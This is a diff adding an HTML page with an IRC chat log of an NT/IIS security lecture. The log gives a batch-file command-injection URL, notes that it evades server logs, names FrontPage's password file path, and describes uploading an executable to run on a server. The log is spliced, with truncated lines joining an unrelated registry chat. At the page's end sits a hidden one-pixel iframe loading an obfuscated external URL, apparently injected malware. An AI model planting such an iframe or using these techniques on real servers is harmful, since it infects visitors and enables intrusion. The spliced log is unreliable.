+  <b>&lt;snider&gt;</b> lol<br>
+  <b>&lt;dr3x&gt;</b> It would run in system context (root)?<br>
+  <font color="#ff0000">*** Cypher sets mode: +v snider</font><br>
+  <b>&lt;m0ded&gt;</b> plx devoice The_Duke when u have +m<br>
+  <b>&lt;Slayer&gt;</b> cypher u are the man<br>
+  <b>&lt;Cypher&gt;</b> m0ded, fine<br>
+  <b>&lt;The_Duke247&gt;</b> whhhy ?<br>
+  <b>&lt;m0ded&gt;</b> he keeps talking<br>
+  <b>&lt;The_Duke247&gt;</b> what ?<br>
+  <b>&lt;Cypher&gt;</b> any questions/comments/corrections/suggestion/yada_yada_yada?<br>
+  <b>&lt;Cypher&gt;</b> The_Duke247, nm it now<br>
+  <b>&lt;dr3x&gt;</b> Would the batch run with root privs?<br>
+  <b>&lt;Cypher&gt;</b> dr3x, it will run with system privs<br>
+  <b>&lt;The_Duke247&gt;</b> shouldn't the question be would it run without ?<br>
+  <b>&lt;Cypher&gt;</b> no, it wouldn't<br>
+  <b>&lt;Cypher&gt;</b> the ? delivers the params<br>
+  <b>&lt;dr3x&gt;</b> k<br>
+  <b>&lt;m0ded&gt;</b> its something like phf<br>
+  <b>&lt;The_Duke247&gt;</b> no, ? was part of my own question<br>
+  <font color="#ff0000">*** syfilis84 has joined #bsrf</font><br>
+  <b>&lt;The_Duke247&gt;</b> not syntax lol<br>
+  <b>&lt;Cypher&gt;</b> but (hate to disappoint ya) it was fixed and patched by Billy
+  :)<br>
+  <font color="#ff0000">*** syfilis84 has left #bsrf</font><br>
+  <b>&lt;snider&gt;</b> ouch, nice nick.. syfilis<br>
+  <b>&lt;Slayer&gt;</b> grr<br>
+  <b>&lt;Cypher&gt;</b> let me now explain what exactly happens and why<br>
+  <b>&lt;Cypher&gt;</b> (in that issue)<br>
+  <b>&lt;Cypher&gt;</b> so it goes like das: /scripts/lalala.bat?&amp;dir+c:\+?&amp;time<br>
+  <b>&lt;Noon_Ghunna&gt;</b> cypher u reading some book? :)<br>
+  <b>&lt;QX-Mat&gt;</b> hey, keep him away!<br>
+  <b>&lt;Cypher&gt;</b> then the following occurs<br>
+  <b>&lt;Cypher&gt;</b> Noon_Ghunna, i made notes to myself earlier :)<br>
+  <b>&lt;Cypher&gt;</b> i can't remember everything :)<br>
+  <b>&lt;QX-Mat&gt;</b> I hear that syfilis.... oh god I had sex ed only last week!<br>
+  <b>&lt;Cypher&gt;</b> so<br>
+  <b>&lt;The_Duke247&gt;</b> gotta run... my errr bath is overflowing?<br>
+  <b>&lt;The_Duke247&gt;</b> :)<br>
+  <b>&lt;The_Duke247&gt;</b> ciao boys and girls<br>
+  <b>&lt;Cypher&gt;</b> later<br>
+  <b>&lt;m0ded&gt;</b> bye<br>
+  <b>&lt;m0ded&gt;</b> go on<br>
+  <b>&lt;Cypher&gt;</b> i'm continuing<br>
+  <font color="#ff0000">*** Cypher sets mode: -v The_Duke247</font><br>
+  <font color="#ff0000">*** aragorn has quit IRC (Quit: Leaving)</font><br>
+  <font color="#ff0000">*** The_Duke247 has quit IRC (Quit: Leaving)</font><br>
+  <b>&lt;Cypher&gt;</b> the first thing is the browser asks u to save the doc or view
+  it with a viewer<br>
+  <font color="#ff0000">*** head__ has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> then it starts a download session<br>
+  <b>&lt;m0ded&gt;</b> downloading what?<br>
+  <b>&lt;Cypher&gt;</b> the file<br>
+  <b>&lt;Cypher&gt;</b> e.g. &quot;Save or Open&quot;<br>
+  <b>&lt;Cypher&gt;</b> u know<br>
+  <b>&lt;Cypher&gt;</b> lalalal.bat<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;QX-Mat&gt;</b> I can type with my nose! Look. .s<br>
+  <b>&lt;Cypher&gt;</b> u click &quot;cancel&quot; but it never termintes cause u used
+  the &quot;time&quot; command :)<br>
+  <b>&lt;QX-Mat&gt;</b> h;lkl:<br>
+  <b>&lt;snider&gt;</b> hmm, maybe +m would help<br>
+  <font color="#ff0000">*** Cypher sets mode: +m</font><br>
+  <b>&lt;Cypher&gt;</b> oh, and _nothing_ is logged on the server<br>
+  <b>&lt;Cypher&gt;</b> cause it was never terminated<br>
+  <b>&lt;Cypher&gt;</b> the only way is to check ALL the security logs<br>
+  <b>&lt;Cypher&gt;</b> which is a veeery long thing on a large network<br>
+  <b>&lt;Cypher&gt;</b> and we know, that admins hate logs ;-)<br>
+  <b>&lt;Cypher&gt;</b> that's their default state of mind<br>
+  <b>&lt;Cypher&gt;</b> so, in conclution, the hax0r (e.g. script kiddie) could excute
+  his milicions code like das<br>
+  <font color="#ff0000">*** zzorro has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> and of course there is no *.bat files in the /scripts dir, but
+  windows mapped it<br>
+  <font color="#ff0000">*** Rockin_lad has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> so it &quot;gotta&quot; use it :)<br>
+  <font color="#ff0000">*** zzorro has left #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> that ends it for this exploit<br>
+  <font color="#ff0000">*** Cypher sets mode: -m</font><br>
+  <b>&lt;Cypher&gt;</b> q?<br>
+  <b>&lt;m0ded&gt;</b> nope<br>
+  <b>&lt;snider&gt;</b> yes<br>
+  <font color="#ff0000">*** drednought has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> shoot snid<br>
+  <b>&lt;snider&gt;</b> is input validation and wrong file permissions all there is to
+  ISS vulns?<br>
+  <b>&lt;snider&gt;</b> IIS*<br>
+  <b>&lt;Cypher&gt;</b> hey drednought. we're having a lecture here, you're welcome to
+  join in<br>
+  <font color="#ff0000">*** zzorro has joined #bsrf</font><br>
+  <b>&lt;zzorro&gt;</b> ol&aacute;<br>
+  <b>&lt;Cypher&gt;</b> snider, nah, its just plain old stupidity also :)<br>
+  <b>&lt;Cypher&gt;</b> hey zzorro<br>
+  <b>&lt;zzorro&gt;</b> io<br>
+  <b>&lt;zzorro&gt;</b> dd tc?<br>
+  <b>&lt;drednought&gt;</b> thanks<br>
+  <b>&lt;snider&gt;</b> what about bufferoverflows in IIS?<br>
+  <b>&lt;snider&gt;</b> or other stuff alike<br>
+  <b>&lt;Cypher&gt;</b> but we don't want that now, do we?<br>
+  <b>&lt;Slayer&gt;</b> yes<br>
+  <b>&lt;snider&gt;</b> okay<br>
+  <b>&lt;Slayer&gt;</b> lol<br>
+  <b>&lt;Cypher&gt;</b> next thing on the chapter - FrontPage-Server Extentions-based
+  IIS holes<br>
+  <b>&lt;snider&gt;</b> wee<br>
+  <b>&lt;snider&gt;</b> :)<br>
+  <b>&lt;Cypher&gt;</b> Frontpage is one hell of a program when it comes to security....
+  ;-)<br>
+  &lt;head__&gt; Cypher: sure is true ;)<br>
+  <b>&lt;Cypher&gt;</b> it has something like ZERO security features<br>
+  <b>&lt;Cypher&gt;</b> not to mention, its a lousy editor :)<br>
+  <b>&lt;m0ded&gt;</b> yup<br>
+  <b>&lt;snider&gt;</b> and Frontpage-server is also an IIS webserver app?<br>
+  <b>&lt;Noon_Ghunna&gt;</b> Frontpage is one hell of a program when it comes to security
+  &lt;--- and web page making too :)<br>
+  <b>&lt;Cypher&gt;</b> its a server extention<br>
+  <b>&lt;Cypher&gt;</b> <b>[Cypher]</b> not to mention, its a lousy editor :)<br>
+  <font color="#ff0000">*** zzorro has quit IRC (Quit: Leaving)</font><br>
+  <b>&lt;Cypher&gt;</b> FP has caused many problems to IIS<br>
+  <font color="#ff0000">*** Rockin_lad has joined #bsrf</font><br>
+  <b>&lt;Noon_Ghunna&gt;</b> Cypher! is FP a webserver too?<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;Cypher&gt;</b> no, an extention (add-on)<br>
+  <b>&lt;m0ded&gt;</b> no<br>
+  <b>&lt;snider&gt;</b> no, he just said that<br>
+  <b>&lt;m0ded&gt;</b> heh<br>
+  <b>&lt;Cypher&gt;</b> lol@m0ded<br>
+  <b>&lt;QX-Mat&gt;</b> FP Exploits..... we gonna be here for ever!<br>
+  <b>&lt;snider&gt;</b> cypher, please go on :)'<br>
+  <b>&lt;Cypher&gt;</b> FP &quot;throws&quot; all kind of dirs to your web, in the form
+  of: _vti_xxx<br>
+  <b>&lt;drednought&gt;</b> are you taking about local security problems or remote?<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, just the basics<br>
+  <b>&lt;Cypher&gt;</b> remote<br>
+  <b>&lt;QX-Mat&gt;</b> ah<br>
+  <b>&lt;Cypher&gt;</b> (now)<br>
+  <b>&lt;Cypher&gt;</b> FP sometimes get so stupid it actually _shows_ you its _own_
+  password file... imagine that....<br>
+  <b>&lt;snider&gt;</b> passwords to do what=<br>
+  <b>&lt;zar&gt;</b> Did i make it for the lecture??????<br>
+  <b>&lt;snider&gt;</b> ?<br>
+  <b>&lt;Rockin_lad&gt;</b> hey zar , wuz up ?<br>
+  <b>&lt;Cypher&gt;</b> for example, if directory browsing is allowed, and proper permission
+  not set (not NTFS for example)<br>
+  <b>&lt;zar&gt;</b> just woke up :)<br>
+  <b>&lt;Cypher&gt;</b> the user could get the file list of the dir<br>
+  <b>&lt;Cypher&gt;</b> a known password file: domain/_vti_pvt/service.pwd<br>
+  <b>&lt;Cypher&gt;</b> it is encrypted of course<br>
+  <font color="#ff0000">*** QX-Mat is now known as QX</font><br>
+  <b>&lt;zar&gt;</b> @#$%ing daylight savings time<br>
+  <b>&lt;Cypher&gt;</b> (FP is not _that_ dumb)<br>
+  <b>&lt;Cypher&gt;</b> but with standard DES<br>
+  <b>&lt;snider&gt;</b> hehe<br>
+  <b>&lt;snider&gt;</b> what are the passwords used for?<br>
+  <b>&lt;Cypher&gt;</b> which will make no prob usually<br>
+  <b>&lt;Cypher&gt;</b> snider, u don't know what to do with passwords?? man..... :-)<br>
+  <font color="#ff0000">*** han has joined #bsrf</font><br>
+  <b>&lt;QX&gt;</b> the passwords are creted using the crypt() command<br>
+  <b>&lt;snider&gt;</b> no i mean, are they access passwords for the NT system?<br>
+  <b>&lt;QX&gt;</b> no<br>
+  <b>&lt;Cypher&gt;</b> no<br>
+  <b>&lt;Cypher&gt;</b> web ones<br>
+  <b>&lt;Cypher&gt;</b> another exploit (in case u find anony ftp writable and fp extentions,
+  of course)<br>
+  <b>&lt;Cypher&gt;</b> u could upload a file to the _vti_bin dir<br>
+  <b>&lt;QX&gt;</b> cos it's public!<br>
+  <b>&lt;Cypher&gt;</b> and issue the following: domain/_vti_bin/your_file<br>
+  <b>&lt;snider&gt;</b> im still baffled about this &quot;web passwords&quot; thing..<br>
+  <b>&lt;Cypher&gt;</b> and the server will be glad to execute your malicious file :)<br>
+  <font color="#ff0000">*** han has quit IRC (Quit: Leaving)</font><br>
+  <b>&lt;Rockin_lad&gt;</b> wow , what a bug unfortunatley I'm still learnin ASP <br>
+  <b>&lt;m0ded&gt;</b> Cypher the dir _vti_bin always exist through ftp?<br>
+  <b>&lt;Rockin_lad&gt;</b> :)<br>
+  <b>&lt;Cypher&gt;</b> snider, FP extentions has a password protection system for your
+  web (FP is also a web manager)<br>
+  <b>&lt;QX&gt;</b> mkfs_dos....<br>
+  <b>&lt;dr3x&gt;</b> what kind of files can be executed in _vti_bin?<br>
+  <b>&lt;Cypher&gt;</b> m0ded, depends on the permissions<br>
+  <b>&lt;Cypher&gt;</b> we are not talking on how to get it ther<br>
+  <b>&lt;Cypher&gt;</b> e<br>
+  <b>&lt;Cypher&gt;</b> i'm saying that it'll be executed<br>
+  <b>&lt;snider&gt;</b> okay, and by web manager you mean that you can upload through
+  it?<br>
+  <b>&lt;Cypher&gt;</b> dr3x, executable ones :)<br>
+  <b>&lt;QX&gt;</b> Simple mime post<br>
+  <b>&lt;Cypher&gt;</b> snider, it manages your site. the permissions, uploads, safety,
+  passwords (e.g. permissions), etc.<br>
+  <b>&lt;Cypher&gt;</b> when u have the password<br>
+  <b>&lt;m0ded&gt;</b> u can deface it<br>
+  <b>&lt;Cypher&gt;</b> u just go to your local (argh)<br>
+  <b>&lt;Cypher&gt;</b> copy of FP<br>
+  <b>&lt;Cypher&gt;</b> and logon<br>
+  <b>&lt;Cypher&gt;</b> to the remote site<br>
+  <font color="#ff0000">*** SteeLe has joined #bsrf</font><br>
+  <b>&lt;QX&gt;</b> SAVE THIS MAN: http://www.elfqrin.com/elfcam.jpg<br>
+  <b>&lt;m0ded&gt;</b> hehe<br>
+  <b>&lt;snider&gt;</b> ahh i see..<br>
+  <b>&lt;Cypher&gt;</b> hey SteeLe<br>
+  <b>&lt;Cypher&gt;</b> you're a bit late for the lecture<br>
+  <b>&lt;SteeLe&gt;</b> hi<br>
+  <b>&lt;SteeLe&gt;</b> what lecture?<br>
+  <b>&lt;Cypher&gt;</b> but no biggy, just two hours :)<br>
+  <b>&lt;m0ded&gt;</b> heh<br>
+  <b>&lt;m0ded&gt;</b> NT Security<br>
+  <b>&lt;zar&gt;</b> lol<br>
+  <b>&lt;SteeLe&gt;</b> aaahh the NT Security lecture<br>
+  <b>&lt;SteeLe&gt;</b> I just remembered about it<br>
+  <b>&lt;m0ded&gt;</b> yeah, remember?<br>
+  <b>&lt;m0ded&gt;</b> ;p<br>
+  <font color="#ff0000">*** SteeLe has quit IRC (Quit: 7th Sphere v3.0 &copy; 1997 7th Sphere Enterprises)</font><br>
+  <b>&lt;Cypher&gt;</b> hehe<br>
+  <b>&lt;Cypher&gt;</b> he went to his time machine :)<br>
+  <b>&lt;m0ded&gt;</b> he left us<br>
+  <font color="#ff0000">*** Megram has joined #bsrf</font><br>
+  <b>&lt;m0ded&gt;</b> go on Cypher<br>
+  <b>&lt;Cypher&gt;</b> i wanted to have a little war game at the end, but unfortunatly
+  i had no chance to set up my other box. so it'll be at some other occations.<br>
+  <font color="#ff0000">*** SteeLe has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> m0ded, actually that's all i had planned to discuss<br>
+  <b>&lt;Cypher&gt;</b> perfect 2 hours :)<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;snider&gt;</b> damn, its over now?<br>
+  <b>&lt;Cypher&gt;</b> any suggestions?<br>
+  <b>&lt;Slayer&gt;</b> yeah it was cool<br>
+  <b>&lt;Slayer&gt;</b> especially the last part<br>
+  <b>&lt;SteeLe&gt;</b> have you gotten to the point as to where NT Sucks?<br>
+  <b>&lt;Noon_Ghunna&gt;</b> when will we see a proper tutorial of this lecture :)<br>
+  <b>&lt;Cypher&gt;</b> now, some feedback - how was it? (don't kill me right away :))<br>
+  <b>&lt;m0ded&gt;</b> IIS and NetBIOS the best parts<br>
+  <b>&lt;Cypher&gt;</b> Noon_Ghunna, as soon as i'll get the time to write them (the
+  log will be published, thought)<br>
+  <b>&lt;m0ded&gt;</b> Cypher u want the logs?<br>
+  <b>&lt;zar&gt;</b> I would have made it in time but didnt get the right time cuz of
+  gay daylight savings....<br>
+  <b>&lt;Noon_Ghunna&gt;</b> IIS and NetBIOS the best parts &lt;---- :( i missed em<br>
+  <b>&lt;QX&gt;</b> Ahh it was very good! Not many typos! (no doubt it has all been typed
+  up before hand!)<br>
+  <b>&lt;Cypher&gt;</b> before hand?<br>
+  <b>&lt;zar&gt;</b> lol QX<br>
+  <b>&lt;Cypher&gt;</b> u mean notes?<br>
+  <font color="#ff0000">*** QX is now known as QX-Mat</font><br>
+  <b>&lt;Cypher&gt;</b> i had a topic list (the one at BSRF) and a syntax list (the bla.bat?)
+  thingies<br>
+  <b>&lt;Cypher&gt;</b> so i wouldn't forget<br>
+  <b>&lt;Cypher&gt;</b> more feedback! mooooreee! mooorreeee!!<br>
+  <b>&lt;Noon_Ghunna&gt;</b> so whose mailing the log ?<br>
+  <b>&lt;dr3x&gt;</b> good job Cypher, you should lecture again soon<br>
+  <b>&lt;Noon_Ghunna&gt;</b> 6Hey 1(14watch out1)6 for the mice14 Cypher 6!1
+  ~~0,14(,,&deg;&deg;&gt; 1 ~~0,14(,,&deg;&deg;&gt;<br>
+  <b>&lt;QX-Mat&gt;</b> As in a large word document that is well prepared, then pasted
+  in.... the best way to do it I think<br>
+  <b>&lt;m0ded&gt;</b> Cypher u want the logs or u' were logging?<br>
+  <b>&lt;Noon_Ghunna&gt;</b> :)<br>
+  <b>&lt;Cypher&gt;</b> haha<br>
+  <b>&lt;Cypher&gt;</b> m0ded, i was, but send it anyways<br>
+  <font color="#ff0000">*** QX-Mat is now known as _QX-Mat-</font><br>
+  <b>&lt;m0ded&gt;</b> heh<br>
+  <b>&lt;m0ded&gt;</b> email address<br>
+  <b>&lt;_QX-Mat-&gt;</b> ah<br>
+  letly when shitting down the PC<br>
+  le_and_hum&raquo; ahm<br>
+  <b>&laquo;+snider&raquo;</b> it has to be<br>
+  <b>&laquo;+snider&raquo;</b> no wait<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> wat's realtime<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> as we change it?<br>
+  <font color="#ff0000">[22:17] *** Quits: drednought (blow@PTlink-5115.eircom.net) (Quit: Leaving)</font><br>
+  <b>[Cypher]</b> the registry can grow more then your RAM<br>
+  <b>&laquo;Rockin_lad&raquo;</b> press on reset<br>
+  <b>[Cypher]</b> rattle_and_hum, yes<br>
+  <b>&laquo;Rockin_lad&raquo;</b> now I'm confuesd<br>
+  <b>[Cypher]</b> realtime - in the action time<br>
+  <b>[Cypher]</b> without delays<br>
+  <b>&laquo;QX-Mat&raquo;</b> This is simple physics. You can't wipe a capsit memory
+  chip... it has to discharge. Computers since the 286 phase, fill the ram with
+  0's when the power is turned off (this is like pico-amps, so a electrolitc capasitor
+  is barly needed). After about 2 seconds the entire momory goes into a-stabliblity,
+  and eventually fades to mother earth (or where ever destroyed electrons go...
+  the gold in other words)<br>
+  <b>&laquo;+snider&raquo;</b> the changes you make are made in the files, so when you
+  reboot it will still load it correctly<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> hmmmm<br>
+  <font color="#ff0000">[22:18] *** Joins: Hand_of_God (VoiD@213.228.116.PTlink-3092)</font><br>
+  <b>&laquo;rattle_and_hum&raquo;</b> but u said that registry is in ram<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> u mean to say that every update is stored in hd
+  too?<br>
+  <b>&laquo;Hand_of_God&raquo;</b> hi!<br>
+  <b>[Cypher]</b> yes<br>
+  <b>[Cypher]</b> hey HoG<br>
+  <b>&laquo;Hand_of_God&raquo;</b> hi Cypher<br>
+  <b>[Cypher]</b> QX-Mat, that's all good.... but... i've just meant that you loose the
+  RAM on shut down<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> that means, effectively registry is a binary that
+  is loaded each time pc starts?<br>
+  <b>&laquo;Noon_Ghunna&raquo;</b> i look likes do<br>
+  <b>[Cypher]</b> i don't really know the inner operatios (thanx for the explanation,
+  btw)<br>
+  <b>&laquo;Noon_Ghunna&raquo;</b> it look likes do<br>
+  <b>&laquo;+snider&raquo;</b> QX-Mat, you obviously have knowledge physics, but it doesnt
+  matter now does it? point is, you cant read the memory if the computer is turned
+  off anyways<br>
+  <b>&laquo;QX-Mat&raquo;</b> Yes, but wiping is DIFFERENT. You do loose, but don't wipe<br>
+  <b>&laquo;Rockin_lad&raquo;</b> RAM=RANDOM ACESS MEMORY<br>
+ <b> &laquo;m0ded&raquo;</b> heh<br>
+ <b> &laquo;m0ded&raquo;</b> correct ;p<br>
+  <b>&laquo;Rockin_lad&raquo;</b> wiped out completly when shitting down the PC<br>
+  <b>[Cypher]</b> QX-Mat, correct. but i can't access it after that, right?<br>
+  <b>&laquo;+snider&raquo;</b> QX-Mat, nitpicking is for people who dont have better
+  to say :)<br>
+  <b>&laquo;TTT&raquo;</b> shitting down????<br>
+  <b>&laquo;TTT&raquo;</b> *LOL<br>
+  <b>[Cypher]</b> so for me (the dumb user) it is gone<br>
+  <b>[Cypher]</b> that concludes our lecture. i hope it was as good for you as it was
+  for me! ;-))<br>
+  <b>[Cypher]</b> gonna get some f00d now<br>
+  <b>&laquo;rattle_and_hum&raquo;</b> btw....QX-MAT: what do u mean by &quot;...fill
+  with 0's...&quot;?<br>
+  <b>[Cypher]</b> be back some time later<br>
+  <font color="#ff0000">[22:20] *** Cypher is now known as Cypher[f00d]</font><br>
+  <b>&laquo;Rockin_lad&raquo;</b> oh yes I enjoyed it , thanks alot cypher<br>
+ <b> &laquo;m0ded&raquo;</b> cya later guys<br>
+ <b> &laquo;m0ded&raquo;</b> cypher good job</p>
+<p><font color="#ff0000">====[ THE END ]=====</font></p>
+<p></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
